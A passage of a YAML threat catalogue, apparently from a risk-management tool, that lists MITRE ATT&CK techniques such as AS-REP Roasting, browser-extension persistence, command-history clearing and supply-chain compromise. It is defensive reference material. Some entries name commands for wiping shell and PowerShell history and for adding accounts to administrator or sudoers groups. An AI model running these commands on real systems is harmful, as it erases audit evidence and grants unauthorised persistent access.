      for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.


      Adversaries may modify and/or replace the Terminal Services DLL to enable persistent
      access to victimized hosts.(Citation: James TermServ DLL) Modifications to this
      DLL could be done to execute arbitrary payloads (while also potentially preserving
      normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable
      features of Terminal Services. For example, an adversary may enable features
      such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)
      sessions by either patching the <code>termsrv.dll</code> file or modifying the
      <code>ServiceDll</code> value to point to a DLL that provides increased RDP
      functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a
      non-server Windows OS this increased functionality may also enable an adversary
      to avoid Terminal Services prompts that warn/log out users of a system when
      a new RDP session is created.

      https://attack.mitre.org/techniques/T1505/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.002
    ref_id: T1059.002
    name: AppleScript
    description: "Adversaries may abuse AppleScript for execution. AppleScript is\
      \ a macOS scripting language designed to control applications and parts of the\
      \ OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript)\
      \ These AppleEvent messages can be sent independently or easily scripted with\
      \ AppleScript. These events can locate open windows, send keystrokes, and interact\
      \ with almost any open application locally or remotely.\n\nScripts can be run\
      \ from the command-line via <code>osascript /path/to/script</code> or <code>osascript\
      \ -e \"script here\"</code>. Aside from the command line, scripts can be executed\
      \ in numerous ways including Mail rules, Calendar.app alarms, and Automator\
      \ workflows. AppleScripts can also be executed as plain text shell scripts by\
      \ adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation:\
      \ SentinelOne AppleScript)\n\nAppleScripts do not need to call <code>osascript</code>\
      \ to execute. However, they may be executed from within mach-O binaries by using\
      \ the macOS [Native API](https://attack.mitre.org/techniques/T1106)s\_<code>NSAppleScript</code>\_\
      or\_<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code>\
      \ command line utility.\n\nAdversaries may abuse AppleScript to execute various\
      \ behaviors, such as interacting with an open SSH connection, moving to remote\
      \ machines, and even presenting users with fake dialog boxes. These events cannot\
      \ start applications remotely (they can start them locally), but they can interact\
      \ with applications if they're already running remotely. On macOS 10.10 Yosemite\
      \ and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s,\
      \ which otherwise would require compilation and execution in a mach-O binary\
      \ file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting\
      \ language, it can be used to launch more common techniques as well such as\
      \ a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation:\
      \ Macro Malware Targets Macs)\nhttps://attack.mitre.org/techniques/T1059/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1176
    ref_id: T1176
    name: Browser Extensions
    description: 'Adversaries may abuse Internet browser extensions to establish persistent
      access to victim systems. Browser extensions or plugins are small programs that
      can add functionality and customize aspects of Internet browsers. They can be
      installed directly or through a browser''s app store and generally have access
      and permissions to everything that the browser can access.(Citation: Wikipedia
      Browser Extension)(Citation: Chrome Extensions Definition)


      Malicious extensions can be installed into a browser through malicious app store
      downloads masquerading as legitimate extensions, through social engineering,
      or by an adversary that has already compromised a system. Security can be limited
      on browser app stores so it may not be difficult for malicious extensions to
      defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending
      on the browser, adversaries may also manipulate an extension''s update url to
      install updates from an adversary controlled server or manipulate the mobile
      configuration file to silently install additional extensions.


      Previous to macOS 11, adversaries could silently install browser extensions
      via the command line using the <code>profiles</code> tool to install malicious
      <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code>
      tool can no longer install configuration profiles, however <code>.mobileconfig</code>
      files can be planted and installed with user interaction.(Citation: xorrior
      chrome extensions macOS)


      Once the extension is installed, it can browse to websites in the background,
      steal all information that a user enters into a browser (including credentials),
      and be used as an installer for a RAT for persistence.(Citation: Chrome Extension
      Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome
      Extension Steals Creds)(Citation: Catch All Chrome Extension)


      There have also been instances of botnets using a persistent backdoor through
      malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation:
      Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also
      use browser extensions to modify browser permissions and components, privacy
      settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation:
      Browers FriarFox)(Citation: Browser Adrozek)

      https://attack.mitre.org/techniques/T1176'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.002
    ref_id: T1499.002
    name: Service Exhaustion Flood
    description: 'Adversaries may target the different network services provided by
      systems to conduct a denial of service (DoS). Adversaries often target the availability
      of DNS and web services, however others have been targeted as well.(Citation:
      Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through
      a variety of means, some of which apply generally while others are specific
      to the software being used to provide the service.


      One example of this type of attack is known as a simple HTTP flood, where an
      adversary sends a large number of HTTP requests to a web server to overwhelm
      it and/or an application that runs on top of it. This flood relies on raw volume
      to accomplish the objective, exhausting any of the various resources required
      by the victim software to provide the service.(Citation: Cloudflare HTTPflood)


      Another variation, known as a SSL renegotiation attack, takes advantage of a
      protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms
      for the client and server to agree on an encryption algorithm to use for subsequent
      secure connections. If SSL renegotiation is enabled, a request can be made for
      renegotiation of the crypto algorithm. In a renegotiation attack, the adversary
      establishes a SSL/TLS connection and then proceeds to make a series of renegotiation
      requests. Because the cryptographic renegotiation has a meaningful cost in computation
      cycles, this can cause an impact to the availability of the service when done
      in volume.(Citation: Arbor SSLDoS April 2012)

      https://attack.mitre.org/techniques/T1499/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195.003
    ref_id: T1195.003
    name: Compromise Hardware Supply Chain
    description: 'Adversaries may manipulate hardware components in products prior
      to receipt by a final consumer for the purpose of data or system compromise.
      By modifying hardware or firmware in the supply chain, adversaries can insert
      a backdoor into consumer networks that may be difficult to detect and give the
      adversary a high degree of control over the system. Hardware backdoors may be
      inserted into various devices, such as servers, workstations, network infrastructure,
      or peripherals.

      https://attack.mitre.org/techniques/T1195/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1106
    ref_id: T1106
    name: Native API
    description: 'Adversaries may interact with the native OS application programming
      interface (API) to execute behaviors. Native APIs provide a controlled means
      of calling low-level OS services within the kernel, such as those involving
      hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation:
      Linux Kernel API) These native APIs are leveraged by the OS during system boot
      (when other system components are not yet initialized) as well as carrying out
      tasks and requests during routine operations.


      Adversaries may abuse these OS API functions as a means of executing behaviors.
      Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059),
      the native API and its hierarchy of interfaces provide mechanisms to interact
      with and utilize various components of a victimized system.


      Native API functions (such as <code>NtCreateProcess</code>) may be directed
      invoked via system calls / syscalls, but these features are also often exposed
      to user-mode applications via interfaces and libraries.(Citation: OutFlank System
      Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example,
      functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code>
      will allow programs and scripts to start other processes.(Citation: Microsoft
      CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary,
      run a CLI command, load modules, etc. as thousands of similar API functions
      exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation:
      GLIBC)


      Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are
      also available to interact with native APIs. These frameworks typically provide
      language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability
      of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS
      Cocoa)(Citation: macOS Foundation)


      Adversaries may use assembly to directly or in-directly invoke syscalls in an
      attempt to subvert defensive sensors and detection signatures such as user mode
      API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper
      with sensors and defensive tools associated with API monitoring, such as unhooking
      monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).

      https://attack.mitre.org/techniques/T1106'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.005
    ref_id: T1558.005
    name: Ccache Files
    description: "Adversaries may attempt to steal Kerberos tickets stored in credential\
      \ cache files (or ccache). These files are used for short term storage of a\
      \ user's active session credentials. The ccache file is created upon user authentication\
      \ and allows for access to multiple services without the user having to re-enter\
      \ credentials. \n\nThe <code>/etc/krb5.conf</code> configuration file and the\
      \ <code>KRB5CCNAME</code> environment variable are used to set the storage location\
      \ for ccache entries. On Linux, credentials are typically stored in the `/tmp`\
      \ directory with a naming format of `krb5cc_%UID%` or `krb5.ccache`. On macOS,\
      \ ccache entries are stored by default in memory with an `API:{uuid}` naming\
      \ scheme. Typically, users interact with ticket storage using <code>kinit</code>,\
      \ which obtains a Ticket-Granting-Ticket (TGT) for the principal; <code>klist</code>,\
      \ which lists obtained tickets currently held in the credentials cache; and\
      \ other built-in binaries.(Citation: Kerberos GNU/Linux)(Citation: Binary Defense\
      \ Kerberos Linux)\n\nAdversaries can collect tickets from ccache files stored\
      \ on disk and authenticate as the current user without their password to perform\
      \ [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.\
      \ Adversaries can also use these tickets to impersonate legitimate users with\
      \ elevated privileges to perform [Privilege Escalation](https://attack.mitre.org/tactics/TA0004).\
      \ Tools like Kekeo can also be used by adversaries to convert ccache files to\
      \ Windows format for further [Lateral Movement](https://attack.mitre.org/tactics/TA0008).\
      \ On macOS, adversaries may use open-source tools or the Kerberos framework\
      \ to interact with ccache files and extract TGTs or Service Tickets via lower-level\
      \ APIs.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: Linux Kerberos\
      \ Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\nhttps://attack.mitre.org/techniques/T1558/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.007
    ref_id: T1070.007
    name: Clear Network Connection History and Configurations
    description: 'Adversaries may clear or remove evidence of malicious network connections
      in order to clean up traces of their operations. Configuration settings as well
      as various artifacts that highlight connection history may be created on a system
      and/or in application logs from behaviors that require network connections,
      such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External
      Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use
      these artifacts to monitor or otherwise analyze network connections created
      by adversaries.


      Network connection history may be stored in various locations. For example,
      RDP connection history may be stored in Windows Registry values under (Citation:
      Microsoft RDP Removal):


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code>


      Windows may also store information about recent RDP connections in files such
      as <code>C:\Users\\%username%\Documents\Default.rdp</code> and `C:\Users\%username%\AppData\Local\Microsoft\Terminal

      Server Client\Cache\`.(Citation: Moran RDPieces) Similarly, macOS and Linux
      hosts may store information highlighting connection history in system logs (such
      as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit
      Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis
      Remote Login and Screen Sharing)


      Malicious network connections may also require changes to third-party applications
      or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004)
      or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries
      may delete or modify this data to conceal indicators and/or impede defensive
      analysis.

      https://attack.mitre.org/techniques/T1070/007'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.004
    ref_id: T1558.004
    name: AS-REP Roasting
    description: "Adversaries may reveal credentials of accounts that have disabled\
      \ Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
      \ Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication\
      \ offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002).\
      \ When enabled, a user requesting access to a resource initiates communication\
      \ with the Domain Controller (DC) by sending an Authentication Server Request\
      \ (AS-REQ) message with a timestamp that is encrypted with the hash of their\
      \ password. If and only if the DC is able to successfully decrypt the timestamp\
      \ with the hash of the user\u2019s password, it will then send an Authentication\
      \ Server Response (AS-REP) message that contains the Ticket Granting Ticket\
      \ (TGT) to the user. Part of the AS-REP message is signed with the user\u2019\
      s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found\
      \ without preauthentication, an adversary may send an AS-REQ message without\
      \ the encrypted timestamp and receive an AS-REP message with TGT data which\
      \ may be encrypted with an insecure algorithm such as RC4. The recovered encrypted\
      \ data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
      \ attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)\
      \ and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan\
      \ 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account\
      \ registered to a domain, with or without special privileges, can be abused\
      \ to list all domain accounts that have preauthentication disabled by utilizing\
      \ Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ with an LDAP filter. Alternatively, the adversary may send an AS-REQ message\
      \ for each user. If the DC responds without errors, the account does not require\
      \ preauthentication and the AS-REP message will already contain the encrypted\
      \ data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits\
      \ Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003),\
      \ [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral\
      \ Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:\
      \ SANS Attacking Kerberos Nov 2014)\nhttps://attack.mitre.org/techniques/T1558/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.003
    ref_id: T1584.003
    name: Virtual Private Server
    description: 'Adversaries may compromise third-party Virtual Private Servers (VPSs)
      that can be used during targeting. There exist a variety of cloud service providers
      that will sell virtual machines/containers as a service. Adversaries may compromise
      VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure,
      adversaries can make it difficult to physically tie back operations to themselves.(Citation:
      NSA NCSC Turla OilRig)


      Compromising a VPS for use in later stages of the adversary lifecycle, such
      as Command and Control, can allow adversaries to benefit from the ubiquity and
      trust associated with higher reputation cloud service providers as well as that
      added by the compromised third-party.

      https://attack.mitre.org/techniques/T1584/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.010
    ref_id: T1059.010
    name: AutoHotKey & AutoIT
    description: 'Adversaries may execute commands and perform malicious tasks using
      AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting
      languages that enable users to automate Windows tasks. These automation scripts
      can be used to perform a wide variety of actions, such as clicking on buttons,
      entering text, and opening and closing programs.(Citation: AutoIT)(Citation:
      AutoHotKey)


      Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious
      code on a victim''s system. For example, adversaries have used for AHK to execute
      payloads and other modular malware such as keyloggers. Adversaries have also
      used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566)
      payloads.(Citation: Splunk DarkGate)


      These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation:
      AutoIT)(Citation: AutoHotKey)

      https://attack.mitre.org/techniques/T1059/010'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1600.001
    ref_id: T1600.001
    name: Reduce Key Space
    description: 'Adversaries may reduce the level of effort required to decrypt data
      transmitted over the network by reducing the cipher strength of encrypted communications.(Citation:
      Cisco Synful Knock Evolution)


      Adversaries can weaken the encryption software on a compromised network device
      by reducing the key size used by the software to convert plaintext to ciphertext
      (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a
      result, adversaries dramatically reduce the amount of effort needed to decrypt
      the protected information without the key.


      Adversaries may modify the key size used and other encryption parameters using
      specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601)
      to change the configuration of the device. (Citation: Cisco Blog Legacy Device
      Attacks)

      https://attack.mitre.org/techniques/T1600/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.003
    ref_id: T1070.003
    name: Clear Command History
    description: "In addition to clearing system logs, an adversary may clear the\
      \ command history of a compromised account to conceal the actions undertaken\
      \ during an intrusion. Various command interpreters keep track of the commands\
      \ users type in their terminal so that users can retrace what they've done.\n\
      \nOn Linux and macOS, these command histories can be accessed in a few different\
      \ ways. While logged in, this command history is tracked in a file pointed to\
      \ by the environment variable <code>HISTFILE</code>. When a user logs off a\
      \ system, this information is flushed to a file in the user's home directory\
      \ called <code>~/.bash_history</code>. The benefit of this is that it allows\
      \ users to go back to commands they've used before in different sessions.\n\n\
      Adversaries may delete their commands from these logs by manually clearing the\
      \ history (<code>history -c</code>) or deleting the bash history file <code>rm\
      \ ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device\
      \ CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to\
      \ clear command history data (<code>clear logging</code> and/or <code>clear\
      \ history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell\
      \ has two different command history providers: the built-in history and the\
      \ command history managed by the <code>PSReadLine</code> module. The built-in\
      \ history only tracks the commands used in the current session. This command\
      \ history is not available to other sessions and is deleted when the session\
      \ ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used\
      \ in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\\
      Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by\
      \ default). This history file is available to all sessions and contains all\
      \ past history since the file is not deleted when the session ends.(Citation:\
      \ Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell\
      \ command <code>Clear-History</code> to flush the entire command history from\
      \ a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code>\
      \ file. Adversaries may also delete the <code>ConsoleHost_history.txt</code>\
      \ file or edit its contents to hide PowerShell commands they have run.(Citation:\
      \ Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History\
      \ Forensics)\nhttps://attack.mitre.org/techniques/T1070/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1202
    ref_id: T1202
    name: Indirect Command Execution
    description: 'Adversaries may abuse utilities that allow for command execution
      to bypass security restrictions that limit the use of command-line interpreters.
      Various Windows utilities may be used to execute commands, possibly without
      invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193),
      the Program Compatibility Assistant (pcalua.exe), components of the Windows
      Subsystem for Linux (WSL), Scriptrunner.exe, as well as other utilities may
      invoke the execution of programs and commands from a [Command and Scripting
      Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via
      scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov
      2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping
      Computer - Scriptrunner.exe)


      Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005),
      specifically to perform arbitrary execution while subverting detections and/or
      mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106)
      or file extensions more commonly associated with malicious payloads.

      https://attack.mitre.org/techniques/T1202'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1091
    ref_id: T1091
    name: Replication Through Removable Media
    description: 'Adversaries may move onto systems, possibly those on disconnected
      or air-gapped networks, by copying malware to removable media and taking advantage
      of Autorun features when the media is inserted into a system and executes. In
      the case of Lateral Movement, this may occur through modification of executable
      files stored on removable media or by copying malware and renaming it to look
      like a legitimate file to trick users into executing it on a separate system.
      In the case of Initial Access, this may occur through manual manipulation of
      the media, modification of systems used to initially format the media, or modification
      to the media''s firmware itself.


      Mobile devices may also be used to infect PCs with malware if connected via
      USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using
      devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation:
      Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For
      example, when a smartphone is connected to a system, it may appear to be mounted
      similar to a USB-connected disk drive. If malware that is compatible with the
      connected system is on the mobile device, the malware could infect the machine
      (especially if Autorun features are enabled).

      https://attack.mitre.org/techniques/T1091'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1005
    ref_id: T1005
    name: Data from Local System
    description: 'Adversaries may search local system sources, such as file systems
      and configuration files or local databases, to find files of interest and sensitive
      data prior to Exfiltration.


      Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059),
      such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network
      Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality
      to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco)
      Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119)
      on the local system.

      https://attack.mitre.org/techniques/T1005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1140
    ref_id: T1140
    name: Deobfuscate/Decode Files or Information
    description: 'Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)
      to hide artifacts of an intrusion from analysis. They may require separate mechanisms
      to decode or deobfuscate that information depending on how they intend to use
      it. Methods for doing that include built-in functionality of malware or by using
      utilities present on the system.


      One such example is the use of [certutil](https://attack.mitre.org/software/S0160)
      to decode a remote access tool portable executable file that has been hidden
      inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi
      Arabia) Another example is using the Windows <code>copy /b</code> command to
      reassemble binary fragments into a malicious payload.(Citation: Carbon Black
      Obfuscation Sept 2016)


      Sometimes a user''s action may be required to open it for deobfuscation or decryption
      as part of [User Execution](https://attack.mitre.org/techniques/T1204). The
      user may also be required to input a password to open a password protected compressed/encrypted
      file that was provided by the adversary. (Citation: Volexity PowerDuke November
      2016)

      https://attack.mitre.org/techniques/T1140'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.005
    ref_id: T1137.005
    name: Outlook Rules
    description: "Adversaries may abuse Microsoft Outlook rules to obtain persistence\
      \ on a compromised system. Outlook rules allow a user to define automated behavior\
      \ to manage email messages. A benign rule might, for example, automatically\
      \ move an email to a particular folder in Outlook if it contains specific words\
      \ from a specific sender. Malicious Outlook rules can be created that can trigger\
      \ code execution when an adversary sends a specifically crafted email to that\
      \ user.(Citation: SilentBreak Outlook Rules)\n\nOnce malicious rules have been\
      \ added to the user\u2019s mailbox, they will be loaded when Outlook is started.\
      \ Malicious rules will execute when an adversary sends a specifically crafted\
      \ email to the user.(Citation: SilentBreak Outlook Rules)\nhttps://attack.mitre.org/techniques/T1137/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562
    ref_id: T1562
    name: Impair Defenses
    description: 'Adversaries may maliciously modify components of a victim environment
      in order to hinder or disable defensive mechanisms. This not only involves impairing
      preventative defenses, such as firewalls and anti-virus, but also detection
      capabilities that defenders can use to audit activity and identify malicious
      behavior. This may also span both native defenses as well as supplemental capabilities
      installed by users and administrators.


      Adversaries may also impair routine operations that contribute to defensive
      hygiene, such as blocking users from logging out, preventing a system from shutting
      down, or disabling or modifying the update process. Adversaries could also target
      event aggregation and analysis mechanisms, or otherwise disrupt these procedures
      by altering other system components. These restrictions can further enable malicious
      operations as well as the continued propagation of incidents.(Citation: Google
      Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)

      https://attack.mitre.org/techniques/T1562'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586.003
    ref_id: T1586.003
    name: Cloud Accounts
    description: 'Adversaries may compromise cloud accounts that can be used during
      targeting. Adversaries can use compromised cloud accounts to further their operations,
      including leveraging cloud storage services such as Dropbox, Microsoft OneDrive,
      or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002)
      or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts
      can also be used in the acquisition of infrastructure, such as [Virtual Private
      Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007)
      infrastructure. Additionally, cloud-based messaging services such as Twilio,
      SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or
      AWS SES (Simple Email Service) may be leveraged for spam or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation:
      Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(Citation: Netcraft
      SendGrid 2024) Compromising cloud accounts may allow adversaries to develop
      sophisticated capabilities without managing their own servers.(Citation: Awake
      Security C2 Cloud)


      A variety of methods exist for compromising cloud accounts, such as gathering
      credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598),
      purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003)
      attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation:
      MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may
      conduct Reconnaissance to inform decisions about which accounts to compromise
      to further their operation. In some cases, adversaries may target privileged
      service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199)
      between service providers and their customers.(Citation: MSTIC Nobelium Oct
      2021)

      https://attack.mitre.org/techniques/T1586/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586.002
    ref_id: T1586.002
    name: Email Accounts
    description: 'Adversaries may compromise email accounts that can be used during
      targeting. Adversaries can use compromised email accounts to further their operations,
      such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598),
      [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email
      campaigns. Utilizing an existing persona with a compromised email account may
      engender a level of trust in a potential victim if they have a relationship
      with, or knowledge of, the compromised persona. Compromised email accounts can
      also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).


      A variety of methods exist for compromising email accounts, such as gathering
      credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598),
      purchasing credentials from third-party sites, brute forcing credentials (ex:
      password reuse from breach credential dumps), or paying employees, suppliers
      or business partners for access to credentials.(Citation: AnonHBGary)(Citation:
      Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct
      Reconnaissance to inform decisions about which accounts to compromise to further
      their operation. Adversaries may target compromising well-known email accounts
      or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566)
      emails may evade reputation-based email filtering rules.


      Adversaries can use a compromised email account to hijack existing email threads
      with targets of interest.

      https://attack.mitre.org/techniques/T1586/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.007
    ref_id: T1098.007
    name: Additional Local or Domain Groups
    description: "An adversary may add additional local or domain groups to an adversary-controlled\
      \ account to maintain persistent access to a system or domain.\n\nOn Windows,\
      \ accounts may use the `net localgroup` and `net group` commands to add existing\
      \ users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation:\
      \ Microsoft Net Group) On Linux, adversaries may use the `usermod` command for\
      \ the same purpose.(Citation: Linux Usermod)\n\nFor example, accounts may be\
      \ added to the local administrators group on Windows devices to maintain elevated\
      \ privileges. They may also be added to the Remote Desktop Users group, which\
      \ allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
      \ to log into the endpoints in the future.(Citation: Microsoft RDP Logons) On\
      \ Linux, accounts may be added to the sudoers group, allowing them to persistently\
      \ leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003)\
      \ for elevated privileges. \n\nIn Windows environments, machine accounts may\
      \ also be added to domain groups. This allows the local SYSTEM account to gain\
      \ privileges on the domain.(Citation: RootDSE AD Detection 2022)\nhttps://attack.mitre.org/techniques/T1098/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1608.001
    ref_id: T1608.001
    name: Upload Malware
    description: 'Adversaries may upload malware to third-party or adversary controlled
      infrastructure to make it accessible during targeting. Malicious software can
      include payloads, droppers, post-compromise tools, backdoors, and a variety
      of other malicious content. Adversaries may upload malware to support their
      operations, such as making a payload available to a victim network to enable
      [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing
      it on an Internet accessible web server.


      Malware may be placed on infrastructure that was previously purchased/rented
      by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583))
      or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).
      Malware can also be staged on web services, such as GitHub or Pastebin, or hosted
      on the InterPlanetary File System (IPFS), where decentralized content storage
      makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus
      November 2020)(Citation: Talos IPFS 2022)


      Adversaries may upload backdoored files, such as application binaries, virtual
      machine images, or container images, to third-party software stores or repositories
      (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims
      may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204).
      [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance
      of users mistakenly executing these files.

      https://attack.mitre.org/techniques/T1608/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195
    ref_id: T1195
    name: Supply Chain Compromise
    description: "Adversaries may manipulate products or product delivery mechanisms\
      \ prior to receipt by a final consumer for the purpose of data or system compromise.\n\
      \nSupply chain compromise can take place at any stage of the supply chain including:\n\
      \n* Manipulation of development tools\n* Manipulation of a development environment\n\
      * Manipulation of source code repositories (public or private)\n* Manipulation\
      \ of source code in open-source dependencies\n* Manipulation of software update/distribution\
      \ mechanisms\n* Compromised/infected system images (multiple cases of removable\
      \ media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider\
      \ Electric USB Malware) \n* Replacement of legitimate software with modified\
      \ versions\n* Sales of modified/counterfeit products to legitimate distributors\n\
      * Shipment interdiction\n\nWhile supply chain compromise can impact any component\
      \ of hardware or software, adversaries looking to gain execution have often\
      \ focused on malicious additions to legitimate software in software distribution\
